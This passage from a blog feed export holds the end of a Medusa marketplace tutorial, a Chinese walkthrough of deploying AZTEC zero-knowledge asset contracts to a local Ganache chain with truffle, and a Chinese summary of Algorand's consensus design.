<p>![Retrieve Products](Open source ecommerce platform for multi-vendor marketplaces/4.png)</p>
<h2 id="Testing-it-Out-Using-Medusa’s-Admin"><a href="#Testing-it-Out-Using-Medusa’s-Admin" class="headerlink" title="Testing it Out Using Medusa’s Admin"></a>Testing it Out Using Medusa’s Admin</h2><p>If you also have a <a href="https://github.com/medusajs/admin">Medusa Admin</a> instance installed, you can also test this out. Log in with the user you created earlier and you’ll see that you can only see the product they added.</p>
<p>![Admin Dashboard](Open source ecommerce platform for multi-vendor marketplaces/5.png)</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>In this tutorial, you learned the first steps of creating a Marketplace using Medusa and Medusa Extender! In later points, you’ll learn about how you can add settings, manage orders, and more!</p>
<p>Be sure to support <a href="https://github.com/adrien2p/medusa-extender">Medusa Extender</a> and check the repository out for more details!</p>
<p>Should you have any issues or questions related to Medusa, then feel free to reach out to the Medusa team via <a href="https://discord.gg/F87eGuwkTp">Discord</a>. You can also contact Adrien <code>@adrien2p</code> for more details or help regarding Medusa Extender.</p>
]]></content>
      <tags>
        <tag>eCommerce</tag>
      </tags>
  </entry>
  <entry>
    <title>AZTEC-基于ethereum的隐私交易-II-发布至Ganache</title>
    <url>/2019/07/29/AZTEC-%E5%9F%BA%E4%BA%8Eethereum%E7%9A%84%E9%9A%90%E7%A7%81%E4%BA%A4%E6%98%93-II-%E5%8F%91%E5%B8%83%E8%87%B3Ganache/</url>
    <content><![CDATA[<h4 id="项目进展"><a href="#项目进展" class="headerlink" title="项目进展"></a>项目进展</h4><p>AZTEC目前已经在 <a href="https://etherscan.io/address/0xcf65A4e884373Ad12cd91c8C868F1DE9DA48501F#code">ethereum mainnet 上线PoC</a>，应用于 DAI 与 AZTEC Token 的转换，即从 DAI 的明文 ERC20 到密文 AZTEC note 的转换。</p>
<p>目前 AZTEC 也可以实现独立密文 Token 的发布和使用，完全基于密文的 Join Split 交易证明。</p>
<p>目前如果是 2 个输入note，2 个输出note，保密交易的情况下，在 ethereum 的 gas 消耗大概是 900,000gas。如果 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1108.md">EIP1108</a> 上线了的话，gas 消耗大约在 200,000 — 300,000gas 之间。</p>
<h4 id="示例项目-step-by-step-发布至-Ganache"><a href="#示例项目-step-by-step-发布至-Ganache" class="headerlink" title="示例项目 step by step 发布至 Ganache"></a>示例项目 step by step 发布至 Ganache</h4><p>1.下载，<code>git clone https://github.com/AztecProtocol/aztec-ganache-starter-kit.git</code></p>
<p>2.安装，<code>cd aztec-ganache-starter-kit &amp;&amp; yarn install</code></p>
<p>3.复制 account 环境，<code>cp RENAME_ME.env .env</code></p>
<p>4.通过 **package.json **的 script，配合.env 中的 account 配置，启动 Ganache，<code>yarn start</code></p>
<p>5.通过 **package.json **的 script，按照 truffle-config.js 中的内容，配合migrations中的发布文件，编译合约并发布至 Ganache，<code>yarn migrate</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  aztec-ganache-starter-kit git:(master) ✗ yarn migrate</span><br><span class="line">yarn run v1.16.0</span><br><span class="line"><span class="meta">$</span><span class="bash"> truffle compile --all &amp;&amp; truffle migrate --reset</span></span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling ./contracts/AceContracts.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling ./contracts/Migrations.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling ./contracts/TestERC20.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/ACE.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/NoteRegistry.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/validators/adjustSupply/AdjustSupply.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/validators/adjustSupply/AdjustSupplyABIEncoder.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/validators/bilateralSwap/BilateralSwap.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/validators/bilateralSwap/BilateralSwapABIEncoder.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/validators/dividendComputation/DividendComputation.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/validators/dividendComputation/DividendComputationABIEncoder.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/validators/joinSplit/JoinSplit.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/validators/joinSplit/JoinSplitABIEncoder.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/validators/privateRange/PrivateRange.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ACE/validators/privateRange/PrivateRangeABIEncoder.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ERC1724/ZkAsset.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ERC1724/ZkAssetMintable.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ERC1724/ZkAssetOwnable.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/ERC20/ERC20Mintable.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/interfaces/AdjustSupplyInterface.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/interfaces/DividendComputationInterface.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/interfaces/IAZTEC.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/interfaces/IZkAsset.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/interfaces/JoinSplitInterface.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/interfaces/PrivateRangeInterface.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/libs/LibEIP712.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/libs/NoteUtils.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/libs/ProofUtils.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling @aztec/protocol/contracts/libs/SafeMath8.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling openzeppelin-solidity/contracts/math/SafeMath.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling openzeppelin-solidity/contracts/ownership/Ownable.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling openzeppelin-solidity/contracts/token/ERC20/ERC20.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiling openzeppelin-solidity/contracts/token/ERC20/IERC20.sol</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Artifacts written to /home/user/Documents/Aztec/aztec-ganache-starter-kit/build/contracts</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Compiled successfully using:</span></span><br><span class="line">   - solc: 0.5.4+commit.9549d8ff.Emscripten.clang</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Everything is up to date, there is nothing to compile.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting migrations...</span><br><span class="line">======================</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Network name:    <span class="string">&#x27;development&#x27;</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Network id:      1564378609369</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Block gas <span class="built_in">limit</span>: 0x6691b7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1_initial_migration.js</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">   Deploying &#x27;Migrations&#x27;</span><br><span class="line">   ----------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> transaction <span class="built_in">hash</span>:    0x6d94779d277c1f3f02ae8bf1e86ca9c62866f308ccd0834347233d2522ac2306</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Blocks: 0            Seconds: 0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> contract address:    0x31bA6208D85a545C75186c51d0F36B1498Fd70bB</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block number:        1</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block timestamp:     1564379036</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> account:             0x909E433c507A398a5405677B5b2767a3f523F73b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> balance:             999.99580786</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas used:            209607</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas price:           20 gwei</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> value sent:          0 ETH</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> total cost:          0.00419214 ETH</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Saving migration to chain.</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Saving artifacts</span></span><br><span class="line">   -------------------------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Total cost:          0.00419214 ETH</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">2_ace.js</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   Deploying &#x27;ACE&#x27;</span><br><span class="line">   ---------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> transaction <span class="built_in">hash</span>:    0x249b155829f8a7c069009129d008751e8c6547d39e54b961cb07d80beec13c29</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Blocks: 0            Seconds: 0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> contract address:    0x7BeDb6777e6fFe535Fc444217A80edf349DB8623</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block number:        3</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block timestamp:     1564379036</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> account:             0x909E433c507A398a5405677B5b2767a3f523F73b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> balance:             999.9273801</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas used:            3379461</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas price:           20 gwei</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> value sent:          0 ETH</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> total cost:          0.06758922 ETH</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   Deploying &#x27;AdjustSupply&#x27;</span><br><span class="line">   ------------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> transaction <span class="built_in">hash</span>:    0xc8c52025eb50204fee60bc65cdb7b7abc09345abff8264e0f88b3f4ec80c54f5</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Blocks: 0            Seconds: 0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> contract address:    0x817888dC24398DEE4A53AB6b247b58C3B22F862c</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block number:        4</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block timestamp:     1564379037</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> account:             0x909E433c507A398a5405677B5b2767a3f523F73b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> balance:             999.9142172</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas used:            658145</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas price:           20 gwei</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> value sent:          0 ETH</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> total cost:          0.0131629 ETH</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   Deploying &#x27;BilateralSwap&#x27;</span><br><span class="line">   -------------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> transaction <span class="built_in">hash</span>:    0xebc929146741026593580155d9d19844c96f65877eb48faa6e43bad2da812db5</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Blocks: 0            Seconds: 0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> contract address:    0xcD53E73dADB6eaD307892C0aBe0bfE5B2f8f570F</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block number:        5</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block timestamp:     1564379037</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> account:             0x909E433c507A398a5405677B5b2767a3f523F73b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> balance:             999.9055876</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas used:            431480</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas price:           20 gwei</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> value sent:          0 ETH</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> total cost:          0.0086296 ETH</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   Deploying &#x27;JoinSplit&#x27;</span><br><span class="line">   ---------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> transaction <span class="built_in">hash</span>:    0x1fa8ac853d1f6c9306418c07e50f85e3fee1a759ccbe79fa5b035fac0083b00c</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Blocks: 0            Seconds: 0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> contract address:    0x77c76635fdBE43afECa6A12cE8588010Ea6f2E02</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block number:        6</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block timestamp:     1564379037</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> account:             0x909E433c507A398a5405677B5b2767a3f523F73b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> balance:             999.8929998</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas used:            629390</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas price:           20 gwei</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> value sent:          0 ETH</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> total cost:          0.0125878 ETH</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   Deploying &#x27;PrivateRange&#x27;</span><br><span class="line">   ------------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> transaction <span class="built_in">hash</span>:    0x5820bd16d8f9b725f2dcfe965dd7d8dd20e80a763ef1a8e7c2a98c35040d05b0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Blocks: 0            Seconds: 0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> contract address:    0xe052a2Ab6b49af87265e7d4b245B0AbFE470865b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block number:        7</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block timestamp:     1564379037</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> account:             0x909E433c507A398a5405677B5b2767a3f523F73b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> balance:             999.88160816</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas used:            569582</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas price:           20 gwei</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> value sent:          0 ETH</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> total cost:          0.01139164 ETH</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   Deploying &#x27;DividendComputation&#x27;</span><br><span class="line">   -------------------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> transaction <span class="built_in">hash</span>:    0x6154f1716037db818d98ce0293c6370b84fca6977863ce90a5f736451dca4c68</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Blocks: 0            Seconds: 0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> contract address:    0x36cBFA4f87a3771E92D51F41fa0E32d5Ca65f340</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block number:        8</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block timestamp:     1564379038</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> account:             0x909E433c507A398a5405677B5b2767a3f523F73b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> balance:             999.86990106</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas used:            585355</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas price:           20 gwei</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> value sent:          0 ETH</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> total cost:          0.0117071 ETH</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Saving migration to chain.</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Saving artifacts</span></span><br><span class="line">   -------------------------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Total cost:          0.12506826 ETH</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3_ZkAsset.js</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   Deploying &#x27;TestERC20&#x27;</span><br><span class="line">   ---------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> transaction <span class="built_in">hash</span>:    0x166f81eec89ffc816f12dbcb05a581194125df3ab191fc8025c425cd641509e2</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Blocks: 0            Seconds: 0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> contract address:    0x1fE2f08A5D69e6A886B349bd8c26407C0e3Ef89d</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block number:        16</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block timestamp:     1564379039</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> account:             0x909E433c507A398a5405677B5b2767a3f523F73b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> balance:             999.84888398</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas used:            629044</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas price:           20 gwei</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> value sent:          0 ETH</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> total cost:          0.01258088 ETH</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   Deploying &#x27;ZkAsset&#x27;</span><br><span class="line">   -------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> transaction <span class="built_in">hash</span>:    0xba9cbfe6a1c5de0126ff7152f12b0b72812c652ad63daa6604bcefd186180a96</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Blocks: 0            Seconds: 0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> contract address:    0x8B02C67c7175a48e1aBA3067b5F5eEA29a051ECd</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block number:        17</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block timestamp:     1564379039</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> account:             0x909E433c507A398a5405677B5b2767a3f523F73b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> balance:             999.81309922</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas used:            1789238</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas price:           20 gwei</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> value sent:          0 ETH</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> total cost:          0.03578476 ETH</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   Deploying &#x27;ZkAssetMintable&#x27;</span><br><span class="line">   ---------------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> transaction <span class="built_in">hash</span>:    0xd8d3c7e33af3e7ec5dfdb8e3a0ee5d3928b884011d87035443ab229f5c7a4502</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Blocks: 0            Seconds: 0</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> contract address:    0x2E63304e1F9f6AD963540A05D3f385426957A2C7</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block number:        18</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> block timestamp:     1564379040</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> account:             0x909E433c507A398a5405677B5b2767a3f523F73b</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> balance:             999.76265604</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas used:            2522159</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> gas price:           20 gwei</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> value sent:          0 ETH</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> total cost:          0.05044318 ETH</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Saving migration to chain.</span></span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Saving artifacts</span></span><br><span class="line">   -------------------------------------</span><br><span class="line"><span class="meta">   &gt;</span><span class="bash"> Total cost:          0.09880882 ETH</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Summary</span><br><span class="line">=======</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Total deployments:   10</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Final cost:          0.22806922 ETH</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Done in 41.03s.</span><br></pre></td></tr></table></figure>

<p>第一步 1_initial_migration.js</p>
<p>第二步 2_ace.js。发布 ACE，<code>setCommonReferenceString</code> 方法建立零知识系统的配置文档</p>
<p><code>await aceContract.setCommonReferenceString(constants.CRS);</code></p>
<p>通过 ACE 的<code>setProof(proofId, address)</code>方法来设定各个执行证明的合约地址。proofId 为 proof 的类别，从<a href="https://www.npmjs.com/package/@aztec/dev-utils"><code>@aztec/dev-utils</code></a>里面取得定义。address为发布的合约地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await aceContract.setProof(MINT_PROOF, AdjustSupply.address);</span><br><span class="line">await aceContract.setProof(BILATERAL_SWAP_PROOF, BilateralSwap.address);</span><br><span class="line">await aceContract.setProof(DIVIDEND_PROOF, DividendComputation.address);</span><br><span class="line">await aceContract.setProof(JOIN_SPLIT_PROOF, JoinSplit.address);</span><br><span class="line">await aceContract.setProof(PRIVATE_RANGE_PROOF, PrivateRange.address);</span><br></pre></td></tr></table></figure>

<p>第三步 3_ZkAsset.js。发布零知识资产（ZkAsset）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// initialise the ZkAsset with an equivilant</span></span><br><span class="line"><span class="keyword">await</span> deployer.deploy(</span><br><span class="line">  ZkAsset,</span><br><span class="line">  aceContract.address,</span><br><span class="line">  TestERC20.address,</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="literal">false</span>,</span><br><span class="line">  <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>此处共计 5 个参数：</p>
<p>1.aceAddress — ACE 的合约地址；</p>
<p>2.linkedTokenAddress — 零知识资产所代表的公开的 ERC20 Token 的合约地址，如不代表特定 Token 则可设定为 address(0)；</p>
<p>3.scalingFactor — 是表示与代表的 ERC20 Token 的转换比例，此处为 1:1 转换；</p>
<p>4.canAdjustSupply — owner 是否可以修改 note 的 totalSupply；</p>
<p>5.canConvert — 是否可以将保密 note 转换回到公开的 ERC20 Token</p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  aztec-ganache-starter-kit git:(master) ✗ truffle test</span><br><span class="line">Using network &#x27;development&#x27;.</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Compiling your contracts...</span><br><span class="line">===========================</span><br><span class="line">\&gt; Everything is up to date, there is nothing to compile.</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  Contract: PrivateVenmo</span><br><span class="line">Bob wants to deposit 100</span><br><span class="line">Bob succesffully deposited 190</span><br><span class="line">Bob takes a taxi, Sally is the driver</span><br><span class="line">The fare comes to 25</span><br><span class="line">Bob paid sally 25 for the taxi and gets 75 back</span><br><span class="line">​    ✓ Bob should be able to deposit 100 then pay sally 25 by splitting notes he owns (5861ms)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  1 passing (6s)</span><br></pre></td></tr></table></figure>

<p>测试程序位于<code>test</code>文件夹内。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>Algorand算法特性总结</title>
    <url>/2018/04/09/Algorand%E7%AE%97%E6%B3%95%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><a href="https://www.algorand.com/">here is algorand网址链接</a></p>
<h4 id="PoW的安全性"><a href="#PoW的安全性" class="headerlink" title="PoW的安全性"></a>PoW的安全性</h4><p>基于PoW的区块链假定矿工拥有生成下一个区块所需的大部分计算能力。但是，工作证明已将权力集中在少数采矿池中。在比特币中，实际上只有三个这样的矿池控制区块链。对于任何实体而言，这种权力集中对于渴望分权的系统是不可接受的，并且很可能是非常危险的。</p>
<h4 id="Bonded-PoS的安全性"><a href="#Bonded-PoS的安全性" class="headerlink" title="Bonded PoS的安全性"></a>Bonded PoS的安全性</h4><p>在基于Bonded PoS的区块链中，每个用户都可能将自己的部分资金置于危险境地。那些这样做的人有权根据他们的赌注选择一个新的区块。原则上，如果他们发现行为不端，他们可能会失去他们的赌注，如果他们主张通过行为失误赚更多的钱，这可能不是很有威慑力。但是，一个普通用户只能负担得起的一小部分资金。因此，这个系统可能会成为富有的不诚实的人的牺牲品，这些个人通过大量的资金来控制区块链。</p>
<h4 id="DPoS的安全性"><a href="#DPoS的安全性" class="headerlink" title="DPoS的安全性"></a>DPoS的安全性</h4><p>在基于DPoS的区块链中，生成区块的权力在很长的时间间隔内被提供给一小部分公认的用户群。这种方法可能比工作量证明的成本更低，但无可否认的是相当集中！在这里，安全依赖于这个小组中大多数人的诚实，但任何一小部分用户都是攻击者的明显目标。</p>
<h4 id="安全在Algorand"><a href="#安全在Algorand" class="headerlink" title="安全在Algorand"></a>安全在Algorand</h4><p>如果系统中的大部分资金由诚实用户所有，Algorand将保证安全工作。请注意，我们并不是谈论一些特殊用户拥有的大部分资金，而是所有用户拥有的资金。此外，Algorand的用户不需要将任何一小部分资金投入赌注。用户的钱始终留在她的手中，随时准备用尽自己的希望。</p>
<h4 id="高效且可扩展"><a href="#高效且可扩展" class="headerlink" title="高效且可扩展"></a>高效且可扩展</h4><p>Algorand因为它在两个阶段产生一个新的块，每一个都完美地缩放。<br>阶段1：随机选择一个用户并提出一个新的区块。<br>阶段2：随机选择一小部分用户来验证并同意该区块。</p>
<h4 id="Algorand不能被审查"><a href="#Algorand不能被审查" class="headerlink" title="Algorand不能被审查"></a>Algorand不能被审查</h4><p>两阶段中，用户按照他们在系统中的金额成比例地选择。它可能不包含在由不诚实用户提出的区块中，但只要其提议者是诚实的，它就会进入新的区块。因此，进入Algorand区块链所需的交易费用也非常低。这允许在平等条件下处理宏观和微观支付。</p>
<h4 id="灵活性是成功的关键。"><a href="#灵活性是成功的关键。" class="headerlink" title="灵活性是成功的关键。"></a>灵活性是成功的关键。</h4><p>Algorand通过其标志性的建议和约定机制产生一个新的区块。在很高的层次上，Algorand秘密并即时召集一小群用户，他们的加密和安全选择能够公平地代表所有用户的社区（由他们在系统中的持股量加权）。这个代表性的委员会就新的区块达成协议，但事实上，它可以用来就其他问题达成一致。例如，改变议定书或修改货币政策。</p>
